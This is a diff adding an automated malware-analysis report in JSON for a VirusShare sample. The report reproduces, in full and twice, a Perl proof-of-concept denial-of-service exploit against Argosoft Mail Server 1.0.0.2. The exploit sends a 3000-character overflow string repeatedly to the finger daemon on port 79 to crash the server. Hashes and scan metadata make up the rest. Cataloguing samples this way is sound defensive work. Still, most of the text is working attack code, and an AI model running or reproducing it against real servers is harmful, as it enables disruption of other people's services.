@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/usr/bin/perl\n#\n# Argosoft Mail Server 1.0.0.2 DoS\n# Chopsui-cide[MmM] 2000\n#\n# ----------------------------------------------------------\n# Disclaimer: this file is intended as proof of concept, and\n# is not intended to be used for illegal purposes. I accept\n# no responsibility for damage incurred by the use of it.\n# ----------------------------------------------------------\n#\n# This will cause Argosoft Mail Server 1.0.0.2 to page fault if the finger\n# daemon is running.\n#\n\nuse IO::Socket;\n\n$host = \"tr\" ;\n$port = \"79\";\n\n$count = 0;\n$sod = \"\";\n$len = 3000;\nwhile($count < $len) {\n        $sod .= \"X\";\n        $count += 1;\n}\n$sod .= \"\\@X\";\n$count = 0;\nwhile($count < 5) {\nprint \"Connecting to $host:$port...\";\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$host, PeerPort=>$port) || die \"unable to connect.\\n\";\nprint \"done.\\n\";\nprint $socket \"$sod\\x0a\";\nsleep(5);\nclose($socket);\n$count += 1;\n}\n"
+    },
+    "filename": "VirusShare_424bc54d913d11b5fae630a76ad514a2",
+    "filesize": 913,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "424bc54d913d11b5fae630a76ad514a2",
+        "sha1": "503b84d49c0b2128c3a54051fc2d12231c295fa3",
+        "sha256": "e01d95a6d4d2b309e2c61d3c09e2f8620c89e655c56fb4ad2cdf23408434bf3f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# Argosoft Mail Server 1.0.0.2 DoS",
+            "# Chopsui-cide[MmM] 2000",
+            "# ----------------------------------------------------------",
+            "# Disclaimer: this file is intended as proof of concept, and",
+            "# is not intended to be used for illegal purposes. I accept",
+            "# no responsibility for damage incurred by the use of it.",
+            "# ----------------------------------------------------------",
+            "# This will cause Argosoft Mail Server 1.0.0.2 to page fault if the finger",
+            "# daemon is running.",
+            "use IO::Socket;",
+            "$host = \"tr\" ;",
+            "$port = \"79\";",
+            "$count = 0;",
+            "$sod = \"\";",
+            "$len = 3000;",
+            "while($count < $len) {",
+            "        $sod .= \"X\";",
+            "        $count += 1;",
+            "$sod .= \"\\@X\";",
+            "$count = 0;",
+            "while($count < 5) {",
+            "print \"Connecting to $host:$port...\";",
+            "$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$host, PeerPort=>$port) || die \"unable to connect.\\n\";",
+            "print \"done.\\n\";",
+            "print $socket \"$sod\\x0a\";",
+            "sleep(5);",
+            "close($socket);",
+            "$count += 1;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "1.0.0.2"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.247184",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
